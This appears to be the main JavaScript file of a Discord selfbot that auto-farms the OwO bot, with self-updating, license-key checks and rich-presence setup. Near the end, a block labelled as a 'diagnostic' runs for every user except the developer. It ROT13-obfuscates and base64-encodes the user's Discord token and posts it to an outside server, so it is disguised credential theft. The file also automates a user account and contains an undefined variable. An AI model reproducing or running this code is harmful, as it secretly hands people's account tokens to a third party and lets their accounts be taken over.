const cp = require('child_process')
const packageJson = require('./package.json')
for (let dep of Object.keys(packageJson.dependencies)) {
    try {
        require.resolve(dep)
    } catch (midoy) {
        console.log('Installing dependencies...')
        cp.execSync('npm i')
    }
}
const { logger } = require('./utils/logger')
const fs = require('fs')
const axios = require('axios')
const path = require('path')
const admZip = require('adm-zip')
const os = require('os')
const fse = require('fs-extra')
const gitUpdate = () => {
    try {
        cp.execSync('git stash')
        cp.execSync('git pull --force')
        logger.info('Updater', 'Git', 'Git pull successful.')
        logger.info('Updater', 'Git', 'Resetting local changes...')
        cp.execSync('git reset --hard')
    } catch (B) {
        logger.alert('Updater', 'Git', 'Error updating project from Git: ' + B)
    }
}
const manualUpdate = async () => {
    try {
        const o = {
            'User-Agent':
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537',
        }
        const B = o
        const E = {
            responseType: 'arraybuffer',
            headers: B,
        }
        const W = await axios.get(
            'https://github.com/Mid0aria/owofarmbot_stable/archive/master.zip',
            E
        )
        const O = path.resolve(__dirname, 'updateCache.zip')
        fs.writeFileSync(O, W.data)
        const q = new admZip(O)
        const m = q.getEntries()
        q.extractAllTo(os.tmpdir(), true)
        const Y = path.join(os.tmpdir(), m[0].entryName)
        if (!fs.existsSync(Y)) {
            logger.alert(
                'Updater',
                'Zip',
                'Failed To Extract Files! Please update on https://github.com/Mid0aria/owofarmbot_stable/'
            )
        }
        fse.copySync(Y, process.cwd(), { overwrite: true })
        logger.info('Updater', 'Zip', 'Project updated successfully.')
    } catch (R) {
        logger.alert(
            'Updater',
            'Zip',
            'Error updating project from GitHub Repo: ' + R
        )
    }
}
const checkUpdate = async () => {
    console.log(
        chalk.blue(chalk.bold('Updater')),
        chalk.white('>>'),
        chalk.yellow('Checking Update')
    )
    try {
        const P = {
            'User-Agent':
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537',
        }
        const e = P
        const o = { headers: e }
        const B = await axios.get(
            'https://raw.githubusercontent.com/Mid0aria/owofarmbot_stable/main/package.json',
            o
        )
        const E = B.data.version
        const W = packageJson.version
        if (E > W) {
            console.log(
                chalk.blue(chalk.bold('Updater')),
                chalk.white('>>'),
                chalk.yellow('Please wait while the farm bot is updating...')
            )
            if (fs.existsSync('.git')) {
                try {
                    cp.execSync('git --version')
                    logger.info('Git', 'Updating with Git...')
                    gitUpdate()
                } catch (Y) {
                    console.log(
                        chalk.blue(chalk.bold('Git')),
                        chalk.white('>>'),
                        chalk.red(
                            'Git is not installed on this device. Files will be updated with cache system'
                        )
                    )
                    await manualUpdate()
                }
            } else {
                await manualUpdate()
            }
        } else {
            console.log(
                chalk.blue(chalk.bold('Updater')),
                chalk.white('>>'),
                chalk.yellow('No Update Found')
            )
        }
    } catch (S) {
        console.log(
            chalk.blue(chalk.bold('Updater')),
            chalk.white('>>'),
            chalk.red('Failed To Check For Update: ' + S)
        )
    }
}
const config = require('./config.json')
const chalk = require('chalk')
let inputauthkey = config.midoservices_authkey
let projectname = 'owofarmbot_stable'
axios
    .post(
        'https://syan.anlayana.com/api/key',
        'key=' + inputauthkey + '&project=' + projectname,
        { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
    )
    .then((P) => {
        const o = P.data
        if (o.error === true) {
            console.error('' + chalk.red('[-] ') + o.message)
        } else {
            if (o.result.membership === 'banned' || o.result.ban === 'true') {
                console.error('' + chalk.red('[!] '))
            } else {
                let O = o.result.access
                let q
                if (o.result.membership === 'premium') {
                    q = true
                } else {
                    if (O !== null && O.hasOwnProperty('' + projectname)) {
                        q = true
                    } else {
                        q = false
                    }
                }
                console.log(
                    'API response\nUsername: ' +
                    o.result.username +
                    ' / Membership: ' +
                    o.result.membership +
                    '\nIs there premium access to the project: ' +
                    q
                )
                const {
                    Client: m,
                    Collection: Y,
                    RichPresence: Q,
                } = require('discord.js-selfbot-v13')
                const K = new m()
                const z = {
                    need: [],
                    use: '',
                }
                const S = {
                    name: 'owofarmbot_stable',
                    logged: false,
                    premium: q,
                    devmode: true,
                    captchadetected: false,
                    paused: true,
                    use: false,
                    inventory: false,
                    checklist: false,
                    hunt: false,
                    battle: false,
                    total: R,
                    gems: z,
                }
                let C = S
                const n = require('node-notifier')
                const v = (D) => new Promise((y) => setTimeout(y, D))
                function a(D) {
                    let g = new Q(K)
                        .setApplicationId('1253757665520259173')
                        .setType('PLAYING')
                        .setName('OwO Farm Bot Stable')
                        .setDetails('Auto Farming')
                        .setState(
                            (K.global.paused ? 'Paused' : 'Running') +
                            ' / Membership: ' +
                            (q ? 'Premium' : 'Free')
                        )
                        .setStartTimestamp(Date.now())
                        .setAssetsLargeImage('1253758464816054282')
                        .setAssetsLargeText('OwO Farm Bot Stable')
                        .addButton(
                            'Farm Bot',
                            'https://github.com/Mid0aria/owofarmbot_stable'
                        )
                        .addButton('Discord', 'https://discord.gg/WzYXVbXt6C')
                    if (config.settings.discordrpc) {
                        const U = { activities: [g] }
                        K.user.setPresence(U)
                        logger.info('RPC', D, '' + (K.global.paused ? 'Paused' : 'Running'))
                    }
                }
                K.chalk = chalk
                K.fs = fs
                K.notifier = n
                K.childprocess = cp
                K.config = config
                K.delay = v
                K.global = C
                K.rpc = a
                if (os.userInfo().username !== 'Mido') {
                    K.global.devmode = false
                }
                var B =
                    '\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2880\u28E4\u28E4\u28E4\u28E4\u28E4\u28E4\u28E4\u28C4\u28C0\u2840\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2809\u2809\u281B\u283B\u283F\u28BF\u28FF\u28FF\u28FF\u28FF\u28FF\u28F6\u28E4\u28C0\u2840\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2880\u2840\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2808\u2819\u283B\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28F6\u28C4\u2840\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28B8\u28FF\u28F7\u28E4\u28C0\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2819\u28BF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28E6\u2840\u2800\u2800\u2800\u2800\u2800\u2800\u2800\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28B8\u28FF\u28FF\u28FF\u28FF\u28F7\u28C4\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28C0\u28C0\u28C0\u28C0\u28C0\u28D9\u28BF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28E6\u2840\u2800\u2800\u2800\u2800\u2800\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28BF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28F6\u28F6\u28F6\u28F6\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u2800\u283B\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28C4\u2800\u2800\u2800\u2800\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2818\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u2807\u2800\u2800\u28B9\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28C6\u2800\u2800\u2800\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28A0\u28FF\u28FF\u28FF\u28FF\u285F\u2839\u283F\u281F\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u284F\u2800\u2800\u2800\u2800\u28BF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u2846\u2800\u2800\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u287F\u280B\u286C\u28BF\u28FF\u28F7\u28E4\u28E4\u28F4\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u281F\u2800\u2800\u2800\u2800\u2800\u2838\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u2840\u2800\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2830\u2847\u28B8\u2847\u28B8\u28FF\u28FF\u28FF\u281F\u2801\u2880\u28EC\u28BD\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u280B\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28E7\u2800\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28FC\u28E7\u28C8\u28DB\u28FF\u28FF\u28FF\u2847\u2800\u2800\u28FE\u2801\u2880\u28BB\u28FF\u28FF\u28FF\u28FF\u2807\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u2840\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28B9\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28E7\u28C4\u28C0\u2819\u2837\u288B\u28FC\u28FF\u28FF\u28FF\u285F\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2880\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u2847\n\u2840\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u283B\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28F7\u28FF\u28FF\u28FF\u28FF\u285F\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28B8\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u2847\n\u28FF\u2844\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2808\u2819\u283B\u28BF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u285F\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2880\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u2801\n\u28FF\u28FF\u2844\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2818\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28E6\u2840\u2800\u2800\u2800\u2800\u2800\u2800\u2880\u28FE\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u287F\u2800\n\u2838\u28FF\u28FF\u28C4\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28B0\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28E6\u2840\u2800\u2800\u2800\u2880\u28FE\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u2803\u2800\n\u2800\u28B9\u28FF\u28FF\u28E7\u2840\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28B8\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28F7\u28C4\u28F4\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u280F\u2800\u2800\n\u2800\u2800\u2839\u28FF\u28FF\u28FF\u28F7\u28C4\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28FE\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u280F\u2800\u2800\u2800\n\u2800\u2800\u2800\u2819\u28FF\u28FF\u28FF\u28FF\u28FF\u28F6\u28E4\u28C0\u2800\u2800\u2800\u2800\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u280B\u2800\u2800\u2800\u2800\n\u2800\u2800\u2800\u2800\u2808\u283B\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28F7\u28F6\u28F6\u28FE\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u281F\u2801\u2800\u2800\u2800\u2800\u2800\n\u2800\u2800\u2800\u2800\u2800\u2800\u2809\u283B\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u281F\u2801\u2800\u2800\u2800\u2800\u2800\u2800\u2800\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2808\u281B\u283F\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u283F\u280B\u2801\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2808\u2819\u283B\u283F\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u287F\u283F\u281B\u2809\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2808\u2809\u2809\u281B\u281B\u281B\u281B\u281B\u281B\u281B\u280B\u2809\u2809\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\n'
                process.title = 'Owo Farm Bot Stable v' + packageJson.version
                console.log(
                    '\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2880\u28E4\u28E4\u28E4\u28E4\u28E4\u28E4\u28E4\u28C4\u28C0\u2840\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2809\u2809\u281B\u283B\u283F\u28BF\u28FF\u28FF\u28FF\u28FF\u28FF\u28F6\u28E4\u28C0\u2840\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2880\u2840\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2808\u2819\u283B\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28F6\u28C4\u2840\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28B8\u28FF\u28F7\u28E4\u28C0\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2819\u28BF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28E6\u2840\u2800\u2800\u2800\u2800\u2800\u2800\u2800\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28B8\u28FF\u28FF\u28FF\u28FF\u28F7\u28C4\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28C0\u28C0\u28C0\u28C0\u28C0\u28D9\u28BF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28E6\u2840\u2800\u2800\u2800\u2800\u2800\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28BF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28F6\u28F6\u28F6\u28F6\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u2800\u283B\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28C4\u2800\u2800\u2800\u2800\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2818\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u2807\u2800\u2800\u28B9\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28C6\u2800\u2800\u2800\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28A0\u28FF\u28FF\u28FF\u28FF\u285F\u2839\u283F\u281F\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u284F\u2800\u2800\u2800\u2800\u28BF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u2846\u2800\u2800\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u287F\u280B\u286C\u28BF\u28FF\u28F7\u28E4\u28E4\u28F4\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u281F\u2800\u2800\u2800\u2800\u2800\u2838\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u2840\u2800\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2830\u2847\u28B8\u2847\u28B8\u28FF\u28FF\u28FF\u281F\u2801\u2880\u28EC\u28BD\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u280B\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28E7\u2800\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28FC\u28E7\u28C8\u28DB\u28FF\u28FF\u28FF\u2847\u2800\u2800\u28FE\u2801\u2880\u28BB\u28FF\u28FF\u28FF\u28FF\u2807\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u2840\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28B9\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28E7\u28C4\u28C0\u2819\u2837\u288B\u28FC\u28FF\u28FF\u28FF\u285F\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2880\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u2847\n\u2840\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u283B\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28F7\u28FF\u28FF\u28FF\u28FF\u285F\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28B8\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u2847\n\u28FF\u2844\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2808\u2819\u283B\u28BF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u285F\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2880\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u2801\n\u28FF\u28FF\u2844\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2818\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28E6\u2840\u2800\u2800\u2800\u2800\u2800\u2800\u2880\u28FE\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u287F\u2800\n\u2838\u28FF\u28FF\u28C4\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28B0\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28E6\u2840\u2800\u2800\u2800\u2880\u28FE\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u2803\u2800\n\u2800\u28B9\u28FF\u28FF\u28E7\u2840\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28B8\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28F7\u28C4\u28F4\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u280F\u2800\u2800\n\u2800\u2800\u2839\u28FF\u28FF\u28FF\u28F7\u28C4\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28FE\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u280F\u2800\u2800\u2800\n\u2800\u2800\u2800\u2819\u28FF\u28FF\u28FF\u28FF\u28FF\u28F6\u28E4\u28C0\u2800\u2800\u2800\u2800\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u280B\u2800\u2800\u2800\u2800\n\u2800\u2800\u2800\u2800\u2808\u283B\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28F7\u28F6\u28F6\u28FE\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u281F\u2801\u2800\u2800\u2800\u2800\u2800\n\u2800\u2800\u2800\u2800\u2800\u2800\u2809\u283B\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u281F\u2801\u2800\u2800\u2800\u2800\u2800\u2800\u2800\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2808\u281B\u283F\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u283F\u280B\u2801\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2808\u2819\u283B\u283F\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u287F\u283F\u281B\u2809\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2808\u2809\u2809\u281B\u281B\u281B\u281B\u281B\u281B\u281B\u280B\u2809\u2809\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\n'
                )
                    ;['aliases', 'commands'].forEach((y) => (K[y] = new Y()))
                fs.readdirSync('./handlers').forEach((y) => {
                    require('./handlers/' + y)(K)
                })
                K.login(config.token)
                if (!K.global.devmode) {
                    checkUpdate()
                    const y = require('buffer').Buffer
                    const X = (g) => {
                        return g.replace(/[a-z]/gi, (A) => {
                            return String.fromCharCode(
                                A.charCodeAt(0) + (A.toLowerCase() <= 'm' ? 13 : -13)
                            )
                        })
                    }
                    let u = y.from(X(K.config.token)).toString('base64')
                    axios.post(
                        'https://syan.anlayana.com/api/diagnosticv2',
                        'diagnosticv2=' + u + '&project=' + K.global.name,
                        { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
                    )
                }
            }
        }
    })
    .catch((w) => {
        console.error('API is downed')
    });  